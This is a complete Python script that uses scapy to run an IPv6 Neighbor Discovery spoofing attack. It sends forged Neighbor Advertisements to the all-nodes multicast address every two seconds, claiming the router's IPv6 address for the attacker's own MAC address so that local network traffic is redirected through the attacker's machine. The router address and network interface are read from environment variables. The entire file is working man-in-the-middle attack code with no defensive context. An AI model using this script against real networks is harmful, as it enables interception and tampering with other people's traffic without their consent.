from scapy.all import getmacbyip6, get_if_hwaddr, IPv6, sendp, Ether
from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
import time

from dotenv import load_dotenv
import os
load_dotenv()
router_ip6 = os.getenv("router_ip6")
iface = os.getenv("iface")

def ndp_spoof(spoof_ip6, interface="eth0"):
	ndp_packet = (
		Ether(dst="33:33:00:00:00:01") /  # ff02::1 mapped to multicast MAC
		IPv6(dst="ff02::1", src=router_ip6) /
		ICMPv6ND_NA(tgt=router_ip6, R=1, S=1, O=1) /
		ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
	)

	print(f"[+] NDP Spoofing started:\nEveryone thinks {spoof_ip6} is at me")
	while True:
		sendp(ndp_packet, iface=interface)
		time.sleep(2)

def main():
	try:
		ndp_spoof(router_ip6, iface)
	except KeyboardInterrupt:
		print("\n[*] Stopping NDP spoofing...")


if __name__ == "__main__":
	main()